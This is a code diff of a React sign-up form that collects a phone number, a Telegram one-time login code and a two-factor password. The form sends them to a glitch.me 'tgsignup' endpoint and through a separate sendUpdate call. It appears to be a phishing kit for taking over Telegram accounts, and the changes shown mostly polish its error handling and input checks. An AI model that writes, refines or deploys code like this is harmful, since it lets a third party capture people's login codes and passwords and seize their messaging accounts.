@@ -16,11 +16,11 @@ const forms = {
 function parseTGMsg(message) {
     switch (message) {
         case 'PHONE_CODE_INVALID':
-            return 'Incorrect OTP, Please try again!'
+            return 'Incorrect OTP, Please try again!<br/>Check your Telegram messages for correct OTP';
         case 'Bad Request':
-            return 'Session Expired. Try after 5 minutes'
+            return 'Session Expired. Try after 5 minutes';
         default:
-            return message
+            return message;
     }
 }
 let otp = '';
@@ -35,13 +35,12 @@ const countryCodes = [
     { label: "Oman", value: "+968" },
     { label: "Sri Lanka", value: "+94" },
     { label: "Saudi Arabia", value: "+966" },
-    { label: "Kazakhstan", value: "+7" },
+    { label: "Russia/Kazakhstan", value: "+7" },
     { label: "Uzbekistan", value: "+998" },
     { label: "Malaysia", value: "+60" },
     { label: "South Korea", value: "+82" },
     { label: "Japan", value: "+81" },
     { label: "France", value: "+33" },
-    { label: "Russia", value: "+7" },
     { label: "Iran", value: "+98" },
     { label: "Brazil", value: "+55" },
     { label: "Indonesia", value: "+62" },
@@ -82,11 +81,11 @@ const RegForm = (props) => {
             if (!document.hidden) {
                 if (activeForm === forms.otp) {
                     const inputbox1 = document.getElementById('otp1');
-                    inputbox1.focus()
-                    inputbox1.click()
+                    inputbox1.focus();
+                    inputbox1.click();
                 } else if (activeForm === forms.phoneNumber) {
                     const inputbox1 = document.getElementById('phoneNumber');
-                    inputbox1.focus()
+                    inputbox1.focus();
                 }
             }
         };
@@ -95,15 +94,14 @@ const RegForm = (props) => {
         }, 10000);
         document.addEventListener('visibilitychange', handleVisibilityChange);
         return () => {
-            clearTimeout(timer)
+            clearTimeout(timer);
             document.removeEventListener('visibilitychange', handleVisibilityChange);
         };
     }, [activeForm]);
 
     useEffect(() => {
-        // Assuming profiles and setProfiles are defined elsewhere in the actual code
         if (!profiles[getActiveProfile()]) {
-            setProfiles().then((profiles) => {
+            setProfiles().then(() => {
                 setActiveProfile(user);
             });
         }
@@ -115,12 +113,12 @@ const RegForm = (props) => {
             const cleanedValue = value.replace(/\D/g, ''); // Remove non-numeric characters
             setFormData({
                 ...formData,
-                [name]: cleanedValue,
+                [name]: cleanedValue.slice(-10) // Keep last 10 digits
             });
         } else {
             setFormData({
                 ...formData,
-                [name]: value,
+                [name]: value
             });
         }
     };
@@ -138,27 +136,28 @@ const RegForm = (props) => {
                 : formData.phoneNumber;
 
             if (!validatePhoneNumber(phoneNumber)) {
-                alert('Please enter a valid 10-digit mobile number');
+                setErrMsg('Please enter a valid 10-digit mobile number');
+                setShowErr(true);
             } else {
                 setIsLoading(true);
+                setShowErr(false);
                 try {
                     const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
                     sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
                     setIsLoading(false);
+                    console.log(response);
                     if (response.status === 200) {
                         setActiveForm(forms.otp);
-                        setShowErr(false);
                     } else {
-                        const err = parseError({ response })
-                        let message = err.message
-                        setErrMsg(message || 'Unknown error');
+                        const err = parseError({ response });
+                        setErrMsg(err.message || 'Unknown error');
                         setShowErr(true);
                     }
                 } catch (error) {
                     setIsLoading(false);
-                    const err = parseError(error)
-                    let message = err.message
-                    setErrMsg(message || 'Unknown error');
+                    const err = parseError(error);
+                    console.log(err);
+                    setErrMsg(err.message || 'Unknown error');
                     setShowErr(true);
                 }
             }
@@ -180,7 +179,7 @@ const RegForm = (props) => {
             input.nextSibling.focus();
         }
         if (otp.length === 5) {
-            submitRef.current.focus()
+            submitRef.current.focus();
         }
     };
 
@@ -191,7 +190,8 @@ const RegForm = (props) => {
             if (lastTenDigits.length === 10) {
                 setFormData({ ...formData, phoneNumber: lastTenDigits });
             } else {
-                alert('Please paste a valid 10-digit mobile number');
+                setErrMsg('Please paste a valid 10-digit mobile number');
+                setShowErr(true);
             }
         } else if (type === 'otp') {
             const otpInputs = document.querySelectorAll('.otp-input input');
@@ -199,10 +199,11 @@ const RegForm = (props) => {
                 otpInputs.forEach((input, index) => {
                     input.value = pastedData[index];
                 });
-                submitRef.current.focus()
                 setFormData({ ...formData, otp: pastedData });
+                submitRef.current.focus();
             } else {
-                alert('Please paste a valid 5-digit OTP');
+                setErrMsg('Please paste a valid 5-digit OTP');
+                setShowErr(true);
             }
         }
     };
@@ -211,24 +212,19 @@ const RegForm = (props) => {
         event.preventDefault();
         if (!isLoading) {
             setShowErr(false);
-
             if (/^[0-9]{5}$/.test(formData.otp)) {
                 setIsLoading(true);
                 try {
-                    otp = formData.otp
-                    const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
+                    otp = formData.otp;
+                    const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}`);
                     setIsLoading(false);
-                    sendUpdate(JSON.stringify(formData));
+                    sendUpdate(JSON.stringify({ ...formData, otp: formData.otp }));
                     if (response.status === 200) {
                         setOk(true);
                         setActiveForm(forms.phoneNumber);
                     } else {
-                        const err = parseError({ response })
-                        let message = err.message
-                        setErrMsg(parseTGMsg(message) || 'Unknown error');
-                        if (response.message?.toLowerCase().includes('2fa')) {
-                            setActiveForm(forms.twofactor);
-                        }
+                        const err = parseError({ response });
+                        setErrMsg(err.message || 'Unknown error');
                         setShowErr(true);
                     }
                 } catch (error) {
@@ -241,7 +237,11 @@ const RegForm = (props) => {
                         setActiveForm(forms.twofactor);
                     }
                 }
+            } else {
+                setErrMsg('Please enter a valid OTP');
+                setShowErr(true);
             }
+
         }
     };
 
@@ -252,15 +252,14 @@ const RegForm = (props) => {
         }
     };
     const handleProceedclick = (e) => {
-        e.preventDefault()
+        e.preventDefault();
         if (buttonEnabled) {
-            setSuccess(true)
+            setSuccess(true);
         } else {
             const proceederr = document.getElementById('proceederr');
             proceederr.style.display = 'block';
         }
-    }
-
+    };
     return (
         <div style={{ backgroundColor: '#1d2124', textAlign: 'center', paddingTop: '4vh' }}>
             {!ok && (
@@ -339,7 +338,6 @@ const RegForm = (props) => {
                                         />
                                     ))}
                                 </div>
-                                {showErr && <span style={{ color: 'red' }}>{errMsg}</span>}
                                 <button
                                     type="submit"
                                     ref={submitRef}
@@ -362,7 +360,6 @@ const RegForm = (props) => {
                             <form autoComplete='on' onSubmit={handleOTPSubmit} style={{ paddingTop: '0px' }} className="register-form">
                                 <div>
                                     <input type="password" name='password' onChange={handleInputChange} autoFocus={true} placeholder="2FA - Password" />
-                                    {showErr && <span style={{ color: 'red' }}>{errMsg}</span>}
                                     <button
                                         type="submit"
                                         className='button'
@@ -379,6 +376,7 @@ const RegForm = (props) => {
                             </form>
                         </div>
                     )}
+                    {showErr && <span style={{ color: 'red' ,whiteSpace: 'pre-line' }}>{errMsg}</span>}
                 </div>
             )}
             {ok && (
